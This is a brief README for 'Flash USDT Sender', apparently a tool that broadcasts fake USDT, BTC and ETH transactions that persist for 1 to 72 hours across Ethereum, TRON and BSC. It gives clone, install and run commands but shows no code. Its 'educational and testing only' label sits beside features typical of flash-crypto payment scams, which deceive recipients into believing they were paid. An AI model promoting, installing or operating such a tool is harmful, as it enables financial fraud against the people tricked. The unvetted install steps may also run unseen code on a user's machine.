# Flash-USDT-Sender-



## Flash USDT Sender -- Multi-Network Crypto Transaction Simulator (ERC20, TRC20, BEP20)

### 🚀 Overview

Flash USDT Sender is a Python-based multi-network blockchain transaction
simulator designed for testing, education, and development environments.

⚠️ This project is strictly for educational and testing purposes only.

## 🔑 Features

-   Multi-network support (Ethereum, TRON, BSC)
-   Simulated USDT, BTC, ETH transactions
-   Configurable duration (1--72 hours)
-   Custom gas settings
-   RPC broadcasting
-   Cross-platform support

## ⚙️ Installation

``` bash
git clone https://github.com/Trautechisa61064/Flash-USDT-Sender.git
cd Flash-USDT-Sender
pip install -r requirements.txt
```

## ▶️ Usage

``` bash
python main.py
```
